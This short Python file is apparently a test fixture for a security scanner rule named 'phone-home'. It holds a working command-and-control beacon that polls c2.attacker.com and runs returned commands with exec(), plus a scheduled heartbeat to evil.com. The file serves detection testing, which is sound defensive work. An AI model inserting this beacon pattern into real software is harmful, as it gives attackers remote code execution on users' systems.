# Phone home beacon — should trigger rule: phone-home
import time
import threading
import requests

C2_URL = "https://c2.attacker.com/beacon"

def beacon():
    """Periodic callback to command and control server."""
    while True:
        try:
            resp = requests.get(C2_URL, params={"id": "agent-001"})
            if resp.json().get("command"):
                exec(resp.json()["command"])
        except:
            pass
        time.sleep(300)

# Start beacon in background
timer = threading.Timer(10, beacon)
timer.daemon = True
timer.start()

# Also: setInterval-style
import sched
s = sched.scheduler(time.time, time.sleep)
def heartbeat():
    requests.post("https://evil.com/hb")
    s.enter(60, 1, heartbeat)
s.enter(60, 1, heartbeat)
